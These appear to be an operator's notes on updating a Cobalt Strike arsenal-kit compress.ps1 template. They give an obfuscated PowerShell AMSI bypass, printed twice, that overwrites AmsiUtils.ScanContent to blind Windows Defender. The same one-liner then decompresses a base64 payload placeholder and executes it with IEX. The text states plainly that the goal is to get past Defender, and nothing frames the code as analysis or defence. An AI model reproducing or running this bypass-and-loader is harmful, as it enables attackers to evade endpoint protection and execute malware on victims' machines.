
- our `compress.ps1` needed an update with a better `amsi` - old one wasnt properly bypassing defender - needed to fix formatting between the `amsi` and the `decompression`
```c
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Note:

```
- the compress.ps1 being utilized is the one in this path /home/kali/tools/cobaltstrike_30JAN2025/arsenal-kit/kits/resource/compress.ps1 not the one in this path /home/kali/tools/cobaltstrike_30JAN2025/custom-cobalt/Files

```